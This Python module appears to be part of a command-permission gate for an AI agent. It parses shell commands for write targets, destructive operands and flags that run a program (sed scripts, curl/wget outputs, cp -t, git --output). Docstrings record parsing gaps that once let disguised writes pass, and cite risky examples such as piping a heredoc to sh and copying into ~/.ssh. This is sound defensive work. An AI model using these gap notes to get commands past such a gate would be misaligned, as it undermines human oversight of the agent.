    _, canonical = _destructive_verb(base, settings)
    if not canonical:
        return ""
    if _is_spelled_flag_verb(canonical):
        return _spelled_flags(canonical, rest)
    found: set[str] = set()
    for token in rest:
        if not token.startswith("-") or token == "-":
            continue
        if token.startswith("--"):
            atoms = [token[2:].split("=", 1)[0]]
        else:
            atoms = list(token[1:])
        for atom in atoms:
            for candidate in FLAG_ALIASES.get(atom, (atom,)):
                if candidate in canonical:
                    found.add(candidate)
                    break
    shorts = [flag for flag in canonical if flag in found and len(flag) == 1]
    longs = [flag for flag in canonical if flag in found and len(flag) > 1]
    suffix = f" -{''.join(shorts)}" if shorts else ""
    return suffix + "".join(f" --{flag}" for flag in longs)


def _matches_flag(token: str, spellings: tuple[str, ...], attached_value_letters: str = "") -> bool:
    """Does this token carry one of these flags — exact, long-with-value, or inside a cluster?

    Short options cluster, so ``sed -Ei`` is ``sed -i`` with extended regexes. The old test was
    ``token.startswith("-i")``, which saw only the cluster's FIRST letter: ``-Ei``, ``-ni`` and
    ``-ri`` all signed as a plain read ``sed`` with no write target (finding R7).

    ``attached_value_letters`` are the letters whose argument may be attached (sed's ``-e``,
    ``-f``, ``-l``): everything after one of them is that argument, not more flags, so
    ``sed -e's/i/x/'`` is not an in-place edit. A flag's own attached suffix is still its own —
    ``-i.bak`` is ``-i`` (sed(1)).
    """
    for spelling in spellings:
        if token == spelling or token.startswith(f"{spelling}="):
            return True
        if len(spelling) != 2 or not spelling.startswith("-"):
            continue
        if not token.startswith("-") or token.startswith("--"):
            continue
        for letter in token[1:]:
            if letter == spelling[1]:
                return True
            if letter in attached_value_letters:
                break
    return False


# --------------------------------------------------------------------------- step 8

def _write_targets(signature: str, argv: tuple[str, ...], settings: GateSettings) -> list[str]:
    """PRD §3.2 step 8: the paths this command names as destinations (critic finding 2)."""
    if not argv:
        return []
    head = argv[0]
    # Computed BEFORE the write_shaped_commands gate (D-56): these commands are not in that list,
    # and a machine override of it must neither drop their targets nor count as a loosening.
    if head == FIND_COMMAND:
        return _find_write_targets(argv)
    if head == "sort":
        return _sort_facts(argv)[0]
    if head == "uniq":
        return _uniq_target(argv)
    if head == "tree":
        return _tree_targets(argv)
    if head == "sed":
        files = _sed_files(list(argv)) if signature == "sed -i" else []
        return files + _sed_script_facts(argv)[0]
    family = "tar" if head in TAR_FAMILY else head
    if family not in settings.write_shaped_commands:
        return []
    if head == "git":
        return _git_targets(signature, argv)
    rest = list(argv[1:])
    positionals = [token for token in rest if not token.startswith("-")]
    if head in ("tee", "touch", "mkdir"):
        return positionals
    if head in COPY_COMMANDS or head == "ln":
        return _copy_targets(head, rest)
    if head == "dd":
        return [token.split("=", 1)[1] for token in rest if token.startswith("of=")]
    if head == "curl":
        # --output-dir puts every saved file — named by -o or by the URL (-O) — in that folder
        names = _flag_values(rest, ("-o", "--output"), attached=True) or _remote_names(rest)
        folder = _flag_values(rest, ("--output-dir",))
        return [posixpath.join(folder[-1], name) for name in names] if folder else names
    if head == "wget":
        named = _flag_values(rest, ("-O", "--output-document"), attached=True)
        if named:
            return named
        prefix = _flag_values(rest, ("-P", "--directory-prefix"), attached=True)
        return [posixpath.join(prefix[-1], name) for name in _url_leaves(rest)] if prefix else []
    if family == "tar":
        return _flag_values(rest, ("-C", "--directory"), attached=True) or ["."]
    if head == "unzip":
        return _flag_values(rest, ("-d",), attached=True) or ["."]
    return []


POSIX_OPTION_PREFIX = "-"
WINDOWS_OPTION_PREFIX = "/"
"""How the two shells spell an option. POSIX options start with a dash; cmd's start with a
slash, which on a POSIX host is indistinguishable from an absolute path — ``del /s /q build``
would otherwise report ``/s`` and ``/q`` as two targets at the filesystem root, and every
Windows delete would ask. Only a token that is one of the verb's OWN declared slash flags
(``settings.destructive_flag_verbs``) is dropped, so a genuine ``del C:/x`` is untouched."""

FIND_EXPRESSION_STARTERS: tuple[str, ...] = ("(", "!")
"""Where ``find``'s path operands stop and its expression begins (find(1)): the first option,
``(`` or ``!``. Read the operands this way rather than as "every non-option token", or
``find . -name '*.pyc' -delete`` would report the GLOB ``*.pyc`` as a target, be unresolvable,
and ask — on the single most ordinary use of the command."""


def _dotted_variant(head: str) -> str:
    """The family name of a ``family.variant`` command, or the head unchanged.

    ``mkfs.ext4`` → ``mkfs``. A head with no dot, or one that starts with a dot (``./script``,
    a hidden file), is returned as-is so it can only ever match itself.
    """
    family, separator, _variant = head.partition(DOTTED_VARIANT_SEPARATOR)
    return family if separator and family else head


def _pushes_a_ref_deletion(argv: tuple[str, ...]) -> bool:
    """Does this ``git push`` carry a delete refspec? (:data:`GIT_REFSPEC_DELETE_PREFIX`.)

    A refspec whose SOURCE side is empty — a positional beginning with ``:`` — asks the remote to
    delete the ref on the other side of the colon. A bare ``:`` (push every matching branch) is
    not a deletion and is left alone.
    """
    return any(
        token.startswith(GIT_REFSPEC_DELETE_PREFIX) and token != GIT_REFSPEC_DELETE_PREFIX
        for token in argv[1:]
    )


def destructive_targets(
    signature: str, argv: tuple[str, ...], settings: GateSettings
) -> list[str] | None:
    """The paths a TARGET-SCOPED destructive command operates on, or None when it has none.

    Owner ruling 2026-09-11 ("auto = thinnest interaction; asks only when genuinely dangerous"):
    deleting ``build/`` inside your own project is routine and deleting ``~/Documents`` is not,
    and the only thing separating them is where the command points. The verbs in
    :data:`~localharness.agent.gate_types.TARGET_SCOPED_DESTRUCTIVE_VERBS` therefore report
    their operands here and ``auto`` judges those against the workspace boundary; every other
    destructive command returns None, which ``auto`` reads as "irreversible regardless of
    target — ask".

    The operand reading is deliberately GENEROUS: everything that is not recognisably an option
    is returned, so ``chmod``'s mode and ``chown``'s owner come back as targets too. They
    resolve inside the directory the command runs in and therefore can never hide a target that
    is outside it — whereas a DROPPED path could, which is the failure that matters.
    """
    if not argv:
        return None
    verb = signature.split(" ", 1)[0]
    if verb not in settings.target_scoped_destructive_verbs:
        return None
    rest = list(argv[1:])
    if verb == FIND_COMMAND:
        return _find_operands(rest)
    slash_flags = {
        flag.lower() for flag in settings.destructive_flag_verbs.get(verb, ())
        if flag.startswith(WINDOWS_OPTION_PREFIX)
    }
    return [
        token for token in rest
        if not token.startswith(POSIX_OPTION_PREFIX) and token.lower() not in slash_flags
    ]


def _find_operands(rest: list[str]) -> list[str]:
    """``find``'s path operands: every token before the expression starts (find(1)).

    A ``find`` with no operand searches the current directory, which is what the fallback says.
    """
    out: list[str] = []
    for token in rest:
        if token.startswith(POSIX_OPTION_PREFIX) or token in FIND_EXPRESSION_STARTERS:
            break
        out.append(token)
    return out or [CURRENT_DIRECTORY]


def _git_targets(signature: str, argv: tuple[str, ...]) -> list[str]:
    """The directory a ``git`` subcommand creates (:data:`GIT_DESTINATION_SHAPES`), or nothing.

    Every other git signature returns no target: git writes inside the repository it is already
    in, which the workspace boundary already covers — these four choose where the repository goes.
    Besides them, ``git diff|log|show --output`` writes a file and ``git diff --no-index`` diffs
    arbitrary filesystem paths (:data:`GIT_OUTPUT_SUBCOMMANDS`); those paths are reported too, and
    a plain ``git diff`` / ``git log`` / ``git show`` still reports nothing.
    """
    words = signature.split()
    if len(words) >= 2 and words[1] in GIT_OUTPUT_SUBCOMMANDS:
        return _git_output_targets(words[1], argv)
    shape = GIT_DESTINATION_SHAPES.get(signature)
    if shape is None:
        return []
    value_flags, rule = shape
    rest = list(argv[1:])
    for word in signature.split()[1:]:  # step past `clone` / `worktree add` / `submodule add`
        if word in rest:
            rest = rest[rest.index(word) + 1:]
    positionals = _positionals(rest, value_flags)
    if rule == GIT_DESTINATION_FIRST:
        return positionals[:1]
    if rule == GIT_DESTINATION_FIRST_OR_CWD:
        return positionals[:1] or [CURRENT_DIRECTORY]
    if len(positionals) >= 2:
        return positionals[-1:]
    return [_repository_name(positionals[0])] if positionals else []


def _find_write_targets(argv: Sequence[str]) -> list[str]:
    """The files ``find -fprint/-fprint0/-fprintf/-fls`` writes (:data:`FIND_WRITE_PRIMARY_PREFIX`).

    A ``-exec`` / ``-ok`` payload is skipped to its terminator: ``find . -exec grep -fprint x {} \\;``
    hands ``-fprint`` to ``grep``, not to find.
    """
    out: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        index += 1
        if token in FIND_PAYLOAD_PRIMARIES:
            while index < len(argv) and argv[index] not in FIND_PAYLOAD_TERMINATORS:
                index += 1
            index += 1
        elif token.startswith(FIND_WRITE_PRIMARY_PREFIX) or token in FIND_WRITE_PRIMARIES:
            if index < len(argv):
                out.append(argv[index])
                index += 1
    return out


def _sort_facts(argv: Sequence[str]) -> tuple[list[str], bool]:
    """``sort`` → (the files ``-o`` / ``--output`` writes, whether ``--compress-program`` runs one).

    Options end at ``--``. A long option is matched on its name before ``=`` as a prefix
    (:data:`SORT_OUTPUT_OPTION`, :data:`SORT_COMPRESS_OPTION`); in a one-dash cluster ``o`` and the
    letters of :data:`SORT_VALUE_LETTERS` take the rest of the cluster, or the next token, as
    their value and end the cluster — so ``-t o`` is a separator and ``-uo out`` an output.
    """
    targets: list[str] = []
    runs_program = False
    index = 1
    while index < len(argv):
        token = argv[index]
        index += 1
        if token == "--":
            break
        if token.startswith("--"):
            name, equals, value = token[2:].partition("=")
            if name and SORT_OUTPUT_OPTION.startswith(name):
                if equals:
                    targets.append(value)
                elif index < len(argv):
                    targets.append(argv[index])
                    index += 1
            elif len(name) >= 2 and SORT_COMPRESS_OPTION.startswith(name):
                runs_program = True
                if not equals:
                    index += 1
            continue
        if token.startswith("-") and token != "-":
            for position, letter in enumerate(token[1:], start=1):
                if letter != "o" and letter not in SORT_VALUE_LETTERS:
                    continue
                attached = token[position + 1:]
                value = attached or (argv[index] if index < len(argv) else "")
                if not attached:
                    index += 1
                if letter == "o" and value:
                    targets.append(value)
                break
    return targets, runs_program


def _uniq_target(argv: Sequence[str]) -> list[str]:
    """``uniq [OPTION]... [INPUT [OUTPUT]]``: the second operand is written (uniq(1)).

    The value of ``-f/-s/-w`` (next token, attached, or ``--skip-fields 1``) is not an operand,
    ``--`` ends the options, and ``-`` alone is an operand (standard input / output).
    """
    operands: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        index += 1
        if token == "--":
            operands.extend(argv[index:])
            break
        if token.startswith("--"):
            name, equals, _ = token[2:].partition("=")
            if not equals and name and any(opt.startswith(name) for opt in UNIQ_VALUE_OPTIONS):
                index += 1
            continue
        if token.startswith("-") and token != "-":
            for position, letter in enumerate(token[1:], start=1):
                if letter in UNIQ_VALUE_LETTERS:
                    if position == len(token) - 1:  # nothing attached: the value is the next token
                        index += 1
                    break
            continue
        operands.append(token)
    return operands[1:2]


def _tree_targets(argv: Sequence[str]) -> list[str]:
    """``tree -o FILE``: a one-dash token containing ``o`` writes to the text after the letter, or
    to the next token when ``o`` is its last letter (``-o out``, ``-ao out``, ``-oout``)."""
    out: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        index += 1
        if not token.startswith("-") or token.startswith("--") or TREE_OUTPUT_LETTER not in token[1:]:
            continue
        attached = token.split(TREE_OUTPUT_LETTER, 1)[1]
        if attached:
            out.append(attached)
        elif index < len(argv):
            out.append(argv[index])
            index += 1
    return out


def _runs_named_program(argv: Sequence[str]) -> bool:
    """Does this command's own flag name a program for it to run? (D-23, D-50, D-51, D-52.)

    ``rg --pre CMD`` / ``--hostname-bin CMD``, ``sort --compress-program P``, ``git grep -O`` /
    ``--open-files-in-pager`` and a ``sed`` script's ``e`` / ``s///e`` / ``-f`` all execute something the model chose from inside a command the
    read-only tier would otherwise wave through. The segment is then inline: guarded asks
    ``interpreter-inline``, read-only denies.
    """
    head = argv[0] if argv else ""
    if head == "rg":
        for token in argv[1:]:
            if token == "--":
                break
            if any(token == flag or token.startswith(f"{flag}=") for flag in RG_PROGRAM_FLAGS):
                return True
        return False
    if head == "sort":
        return _sort_facts(argv)[1]
    if head == "sed":
        return _sed_script_facts(argv)[1]
    if head == "git":
        found = _first_subcommand("git", list(argv[1:]))
        if found is None or found[0] != "grep":
            return False
        for token in found[1]:
            if token == "--":
                break
            if token.startswith("--"):
                name = token[2:].split("=", 1)[0]
                if len(name) >= 2 and GIT_GREP_PAGER_OPTION.startswith(name):
                    return True
            elif token.startswith("-") and "O" in token[1:]:
                return True
    return False


def _sed_script_facts(argv: Sequence[str]) -> tuple[list[str], bool]:
    """``sed`` → (the files its script writes with ``w`` / ``W`` / ``s///w``, whether it runs a command).

    sed(1), D-54. The options are read first (:data:`SED_FLAG_LETTERS`, :data:`SED_LONG_OPTIONS`):
    every ``-e`` / ``--expression`` value is a script, joined by newlines; with none, the first
    operand is the script. ``-f`` / ``--file`` names a script file nobody has read, and an option
    this scanner does not know, or one that is ambiguous, cannot be reasoned about — both count as
    running a command. The script is then parsed by :func:`_sed_script_commands` and never
    substring-matched (a regex may contain ``w out``).
    """
    scripts: list[str] = []
    operands: list[str] = []
    runs_command = False
    index = 1
    while index < len(argv):
        token = argv[index]
        index += 1
        if token == "--":
            operands.extend(argv[index:])
            break
        if token.startswith("--"):
            name, equals, value = token[2:].partition("=")
            matches = [opt for opt in SED_LONG_OPTIONS if opt.startswith(name)]
            option = name if name in SED_LONG_OPTIONS else (matches[0] if len(matches) == 1 else "")
            if not name or not option:
                runs_command = True
            elif option in ("expression", "file", "line-length"):
                if not equals:
                    value = argv[index] if index < len(argv) else ""
                    index += 1
                if option == "expression":
                    scripts.append(value)
                elif option == "file":
                    runs_command = True
            continue
        if token.startswith("-") and token != "-":
            for position, letter in enumerate(token[1:], start=1):
                if letter in SED_FLAG_LETTERS:
                    continue
                if letter in "efl":
                    value = token[position + 1:]
                    if not value:
                        value = argv[index] if index < len(argv) else ""
                        index += 1
                    if letter == "e":
                        scripts.append(value)
                    elif letter == "f":
                        runs_command = True
                elif letter != "i":
                    runs_command = True  # an option we do not know: assume the worst
                break  # `i` takes the rest of the cluster as a backup suffix
            continue
        operands.append(token)
    if not scripts and not runs_command and operands:
        scripts.append(operands[0])
    targets, runs = _sed_script_commands("\n".join(scripts))
    return targets, runs_command or runs


def _sed_script_commands(script: str) -> tuple[list[str], bool]:
    """Walk one sed script command by command: (``w`` / ``W`` / ``s///w`` files, runs a command).

    Commands are separated by ``;``, a newline, ``{`` and ``}``. Each is: optional addresses
    (digits, ``$``, ``/re/`` or ``\\cREc`` with ``I``/``M``, ``first~step``, ``,addr2`` including
    ``+N`` / ``~N``) and ``!``, then one command letter by :data:`SED_NO_ARGUMENT_COMMANDS` and its
    siblings. ``w`` / ``W`` take the rest of the line as a file, ``e`` runs a command, ``s`` is
    read as delimiter, regex, replacement, flags (``e`` runs a command, ``w`` takes the rest of
    the line as a file). A character that is not a command, or a part that never terminates, counts
    as running a command: when the scanner cannot read the script, it assumes the worst.
    """
    targets: list[str] = []
    length = len(script)

    def line_end(start: int) -> int:
        end = script.find("\n", start)
        return length if end < 0 else end

    def delimited(start: int, delimiter: str) -> int:
        """Index just past the closing delimiter (backslash escapes the next character), or -1."""
        position = start
        while position < length:
            char = script[position]
            if char == "\\":
                position += 2
                continue
            if char == delimiter:
                return position + 1
            position += 1
        return -1

    def address(start: int, second: bool) -> int:
        """Index past an address at ``start``, ``start`` if there is none, -2 if malformed."""
        if start >= length:
            return start
        char = script[start]
        if char.isdigit() or (second and char in "+~"):
            end = start + 1
            while end < length and script[end].isdigit():
                end += 1
            if char.isdigit() and end < length and script[end] == "~":
                end += 1
                while end < length and script[end].isdigit():
                    end += 1
            return end
        if char == "$":
            return start + 1
        if char in "/\\":
            if char == "/":
                end = delimited(start + 1, "/")
            else:
                end = delimited(start + 2, script[start + 1]) if start + 1 < length else -1
            if end < 0:
                return -2
            while end < length and script[end] in SED_ADDRESS_FLAGS:
                end += 1
            return end
        return start

    index = 0
    while index < length:
        char = script[index]
        if char in " \t\n;{}":
            index += 1
            continue
        first = address(index, second=False)
        if first == -2:
            return targets, True
        index = first
        while index < length and script[index] in " \t":
            index += 1
        if index < length and script[index] == ",":
            index += 1
            while index < length and script[index] in " \t":
                index += 1
            second = address(index, second=True)
            if second == -2 or second == index:
                return targets, True
            index = second
        while index < length and script[index] in " \t!":
            index += 1
        if index >= length:
            return targets, True  # addresses with no command
        command = script[index]
        index += 1
        if command in "{}":
            continue
        if command == "#":
            index = line_end(index)
        elif command in SED_TEXT_COMMANDS:
            index = line_end(index)
            # a line ending in an ODD number of backslashes continues the text on the next line
            while index < length and (len(script[:index]) - len(script[:index].rstrip("\\"))) % 2:
                index = line_end(index + 1)
        elif command in SED_FILE_COMMANDS:
            index = line_end(index)
        elif command in SED_LABEL_COMMANDS:
            while index < length and script[index] in " \t":
                index += 1
            stops = " \t\n;" if command == ":" else " \t\n;}"
            while index < length and script[index] not in stops:
                index += 1
        elif command == "y":
            if index >= length or script[index] in "\n\\":
                return targets, True
            delimiter = script[index]
            mid = delimited(index + 1, delimiter)
            end = delimited(mid, delimiter) if mid > 0 else -1
            if end < 0:
                return targets, True
            index = end
        elif command in "wW":
            end = line_end(index)
            name = script[index:end].strip()
            if not name:
                return targets, True
            targets.append(name)
            index = end
        elif command == "e":
            return targets, True
        elif command == "s":
            if index >= length or script[index] in "\n\\":
                return targets, True
            delimiter = script[index]
            mid = delimited(index + 1, delimiter)
            end = delimited(mid, delimiter) if mid > 0 else -1
            if end < 0:
                return targets, True
            index = end
            while index < length and script[index] not in " \t\n;}#":
                flag = script[index]
                if flag == "e":
                    return targets, True
                if flag == "w":
                    stop = line_end(index + 1)
                    name = script[index + 1:stop].strip()
                    if not name:
                        return targets, True
                    targets.append(name)
                    index = stop
                    break
                if flag not in SED_SUBSTITUTE_PLAIN_FLAGS:
                    return targets, True
                index += 1
        elif command in SED_NUMBER_COMMANDS:
            while index < length and script[index] in " \t":
                index += 1
            while index < length and script[index].isdigit():
                index += 1
        elif command in SED_NO_ARGUMENT_COMMANDS:
            pass
        else:
            return targets, True
    return targets, False


def _git_directory_prefix(args: list[str]) -> str:
    """CR-54: where ``git -C A -C B …`` runs, as written: each ``-C`` is relative to the previous one.

    Only the global flags before the subcommand are read (the same walk as :func:`_first_subcommand`).
    An absolute or ``~`` value restarts the path; the result is empty when no ``-C`` is given. A value
    holding ``$`` or a backtick stays in the path, so the target built from it is unresolvable and the
    verdict treats it as outside, the way it treats any such write target.
    """
    value_flags = SUBCOMMAND_VALUE_FLAGS.get("git", frozenset())
    prefix = ""
    index = 0
    while index < len(args):
        token = args[index]
        if not token.startswith("-"):
            break
        if token == "-C" and index + 1 < len(args):
            value = args[index + 1]
            if value:
                prefix = value if (not prefix or value.startswith(("/", "~"))) else posixpath.join(prefix, value)
        index += 2 if token in value_flags else 1
    return prefix


def _git_output_targets(subcommand: str, argv: tuple[str, ...]) -> list[str]:
    """The files ``git diff|log|show`` writes (``--output``) or reads outside a repository
    (``diff --no-index``), read off the arguments that follow the subcommand.

    ``--output`` is only honoured before a bare ``--`` (after it, everything is a pathspec).
    With ``--no-index`` every operand is a path: git permutes options, so operands on either side
    of the flag count, and a ``--`` is skipped rather than ending the scan. Over-reporting is the
    safe direction here — an extra target only asks when it leaves the project.
    """
    found = _first_subcommand("git", list(argv[1:]))
    if found is None:  # pragma: no cover - the signature already named a subcommand
        return []
    after = found[1]
    outputs: list[str] = []
    operands: list[str] = []
    no_index = False
    options_ended = False
    index = 0
    while index < len(after):
        token = after[index]
        index += 1
        if options_ended:
            operands.append(token)
        elif token == "--":
            options_ended = True
        elif token == GIT_OUTPUT_FLAG:
            if index < len(after):
                outputs.append(after[index])
                index += 1
        elif token.startswith(f"{GIT_OUTPUT_FLAG}="):
            outputs.append(token.split("=", 1)[1])
        elif token == GIT_NO_INDEX_FLAG and subcommand == "diff":
            no_index = True
        elif not token.startswith("-"):
            operands.append(token)
    targets = outputs + (operands if no_index else [])
    # git applies `-C DIR` before it opens `--output` or a `--no-index` operand, so a relative one lives under DIR.
    where = _git_directory_prefix(list(argv[1:]))
    if where:
        targets = [t if t.startswith(("/", "~")) else posixpath.join(where, t) for t in targets]
    return targets


def _repository_name(source: str) -> str:
    """The directory ``git clone URL`` makes in the cwd: the URL's last component without ``.git``.

    ``https://host/org/tool.git`` → ``tool``, matching git's own default (git-clone(1)). A source
    that resolves to nothing (a bare host, a substitution) keeps the sentinel so the write is
    reported as unresolvable rather than silently dropped.
    """
    leaf = _leaf(source.split("?", 1)[0].split("#", 1)[0])
    if leaf.endswith(".git"):
        leaf = leaf[: -len(".git")]
    return leaf or SUBSTITUTION_SENTINEL


def _copy_targets(head: str, rest: list[str]) -> list[str]:
    """Destinations of ``cp``/``mv``/``install``/``rsync`` (PRD §3.2 step 8, finding R6).

    Normally the last positional, but ``-t DIR`` / ``--target-directory[=]DIR`` moves the
    destination into a flag and makes every positional a source — so the targets are the sources'
    names inside DIR (``cp -t ~/.ssh mykey`` writes ``~/.ssh/mykey``). See
    :data:`TARGET_DIRECTORY_COMMANDS` for why ``rsync`` keeps the positional rule.
    """
    if head in TARGET_DIRECTORY_COMMANDS:
        ops = copy_operands(rest)
        if ops.into and ops.destination is not None:
            return [posixpath.join(ops.destination, _leaf(source))
                    for source in ops.sources] or [ops.destination]
        return [ops.destination] if ops.destination is not None else list(ops.sources)
    positionals = [token for token in rest if not token.startswith("-")]
    return positionals[-1:] if len(positionals) >= 2 else positionals


class CopyOperands(NamedTuple):
    """What a ``cp``/``mv``/``install``/``ln`` command copies, and where to."""

    sources: tuple[str, ...]
    destination: Optional[str]
    into: bool
    """The destination was named by ``-t`` / ``--target-directory``: every source lands in it."""
    contents: bool
    """``-T`` / ``--no-target-directory``: the destination is the copy itself, so a directory
    source's CONTENTS land in it under names the command line does not show."""


def copy_operands(rest: Sequence[str]) -> CopyOperands:
    """Split a cp/mv/install/ln argument list (after the program) into sources and destination.

    Reads ``-t DIR``, ``-tDIR``, ``--target-directory[=]DIR`` and a cluster ending in ``t``
    (``-sft DIR``); skips the value of every value-taking option (``-m 755``, ``-S .bak``,
    ``--suffix X``) so it is never read as a path; ``--`` ends the options."""
    positionals: list[str] = []
    target: Optional[str] = None
    no_target = False
    index = 0
    while index < len(rest):
        token = rest[index]
        index += 1
        if token == "--":
            positionals += rest[index:]
            break
        if token.startswith("--"):
            name, eq, value = token.partition("=")
            if name in TARGET_DIRECTORY_FLAGS:
                if eq:
                    target = value
                elif index < len(rest):
                    target, index = rest[index], index + 1
            elif name in NO_TARGET_DIRECTORY_FLAGS:
                no_target = True
            elif name in COPY_VALUE_FLAGS and not eq and name not in ("--backup", "--context"):
                index += 1  # its value is the next word
            continue
        if token.startswith("-") and token != "-":
            letters = token[1:]
            for at, letter in enumerate(letters):
                if letter == "T":
                    no_target = True
                if letter in COPY_VALUE_LETTERS:
                    value = letters[at + 1:]
                    if not value and index < len(rest):
                        value, index = rest[index], index + 1
                    if letter == "t":
                        target = value
                    break
            continue
        positionals.append(token)
    if target is not None and not no_target:
        return CopyOperands(tuple(positionals), target, True, False)
    if len(positionals) >= 2:
        return CopyOperands(tuple(positionals[:-1]), positionals[-1], False, no_target)
    return CopyOperands(tuple(positionals), None, False, no_target)


WGET_VALUE_FLAGS: frozenset[str] = frozenset({
    "-P", "--directory-prefix", "-O", "--output-document", "-o", "--output-file",
    "-a", "--append-output", "-e", "--execute", "-U", "--user-agent", "--header", "-i",
    "--input-file", "-B", "--base", "-t", "--tries", "-T", "--timeout", "-w", "--wait", "--user",
    "--password", "-l", "--level", "-A", "--accept", "-R", "--reject", "-D", "--domains",
    "-X", "--exclude-directories", "-I", "--include-directories",
})
"""wget options whose next word is a value, not a URL (wget(1))."""


def _url_leaves(rest: list[str]) -> list[str]:
    """The file name each URL of a ``wget`` saves under, by default: the last path segment."""
    urls = _positionals(rest, WGET_VALUE_FLAGS)
    return [url.split("?", 1)[0].rstrip("/").rsplit("/", 1)[-1] or SUBSTITUTION_SENTINEL
            for url in urls] or [SUBSTITUTION_SENTINEL]


def _positionals(rest: list[str], value_flags: frozenset[str]) -> list[str]:
    """Arguments that are paths: options dropped, and the value of a value-taking option too."""
    out: list[str] = []
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-") and token != "-":
            index += 2 if token in value_flags else 1
            continue
        out.append(token)
        index += 1
    return out


def _leaf(path: str) -> str:
    """The name a copy keeps when it lands in a directory (``src/key`` → ``key``)."""
    return posixpath.basename(path.rstrip("/")) or path


def _flag_values(rest: list[str], flags: tuple[str, ...], *, attached: bool = False) -> list[str]:
    """Values of ``flag VALUE`` / ``flag=VALUE`` occurrences — and, with ``attached``, of a short
    flag written with its value attached (``-C/dir``, ``-d/dir``, ``-ofile``)."""
    values: list[str] = []
    for index, token in enumerate(rest):
        if token in flags and index + 1 < len(rest):
            values.append(rest[index + 1])
        elif any(token.startswith(f"{flag}=") for flag in flags):
            values.append(token.split("=", 1)[1])
        elif attached and len(token) > 2 and any(
                len(flag) == 2 and flag[0] == "-" and flag[1] != "-" and token.startswith(flag)
                for flag in flags):
            values.append(token[2:])
    return values


def _remote_names(rest: list[str]) -> list[str]:
    """``curl -O URL`` writes the URL's basename into the cwd (PRD §3.2 step 8)."""
    if not any(token == "-O" or (token.startswith("-") and not token.startswith("--") and "O" in token)
               for token in rest):
        return []
    urls = [token for token in rest if not token.startswith("-")]
    if not urls:
        return [SUBSTITUTION_SENTINEL]
    return [urls[-1].split("?", 1)[0].rstrip("/").rsplit("/", 1)[-1] or SUBSTITUTION_SENTINEL]


def _sed_files(argv: list[str]) -> list[str]:
    """``sed -i`` rewrites its file arguments in place; the script is not a file."""
    rest = argv[1:]
    has_script_flag = any(
        token in SED_SCRIPT_FLAGS or token.split("=", 1)[0] in SED_SCRIPT_FLAGS for token in rest
    )
    positionals: list[str] = []
    index = 0
    while index < len(rest):
        token = rest[index]
        if token.startswith("-"):
            index += 2 if token in SED_SCRIPT_FLAGS else 1
            continue
        positionals.append(token)
        index += 1
    if has_script_flag:
        return positionals
    return positionals[1:]


# --------------------------------------------------------------------------- tokenizing

def _extract_redirections(text: str) -> tuple[str, list[str]]:
    """Pull ``>``/``>>`` targets out of one command, returning the rest (PRD §3.2 step 8).

    Input redirections (``<``, ``<<<``) and fd duplications (``2>&1``) are removed without a
    target. ``shlex`` cannot do this: it has no operator grammar.
    """
    out: list[str] = []
    targets: list[str] = []
    index = 0
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            out.append(char)
            if char == "\\" and quote in ('"', "`") and index + 1 < len(text):
                out.append(text[index + 1])
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"`":
            quote = char
            out.append(char)
            index += 1
            continue
        if char in "<>" or (char == "&" and text[index + 1 : index + 2] == ">"):
            operator = ""
            if char == "&":
                operator = "&"
                index += 1
                char = text[index]
            else:
                # A leading fd number is part of the operator (`2>log`), not of the word
                # before it; `&>log` reaches us with the `&` already buffered.
                while out and out[-1].isdigit():
                    out.pop()
                if out and out[-1] == "&":
                    out.pop()
                    operator = "&"
            operator += char
            index += 1
            duplicates_fd = False
            while index < len(text) and text[index] in REDIRECTION_OPERATOR_CHARS:
                duplicates_fd = duplicates_fd or text[index] == "&"
                operator += text[index]
                index += 1
            while index < len(text) and text[index] in " \t":
                index += 1
            word, index = _read_word(text, index)
            # `N>&M`, `>&M`, `<&M`, `N>&-` move a file descriptor — no file is named, and the
            # operand (`1`, `-`) is not a command. `&>FILE` and `N>FILE` do name a file.
            if ">" in operator and not duplicates_fd and word and not word.startswith("&"):
                targets.append(_unquote(word))
            out.append(" ")
            continue
        out.append(char)
        index += 1
    return "".join(out), targets


HEREDOC_WORD_STOPS = frozenset(";&|<>()")
"""The characters that end a here-document delimiter or here-string operand besides a blank: the
shell's operators (CR-55). ``cat <<E|sh`` pipes to ``sh``; the delimiter is ``E``."""


def _read_word(text: str, index: int, stops: frozenset[str] = frozenset()) -> tuple[str, int]:
    """Read one whitespace-delimited word from ``index``, honouring quotes.

    ``stops`` are unquoted characters that end the word as a blank does and stay in the text."""
    out: list[str] = []
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            out.append(char)
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"":
            quote = char
            out.append(char)
            index += 1
            continue
        if char in " \t\n" or char in stops:
            break
        out.append(char)
        index += 1
    return "".join(out), index


def _unquote(word: str) -> str:
    """Drop one level of shell quoting from a single word."""
    try:
        parts = shlex.split(word)
    except ValueError:
        return word.strip("'\"")
    return parts[0] if parts else word


def _tokenize(text: str) -> list[str]:
    """``shlex`` one command; fall back to whitespace on bad quoting.

    ``comments=False`` (CR-53): ``shlex`` would end a word at a ``#`` anywhere in it, unlike bash, and
    hide ``git diff a#b --output=x`` or ``{#;rm x``. The real comments are gone by now, dropped by
    :func:`_join_continuations`, which every command text and every lifted payload goes through."""
    text = _collapse_array_literals(text)
    try:
        return shlex.split(text, comments=False)
    except ValueError:
        return text.split()
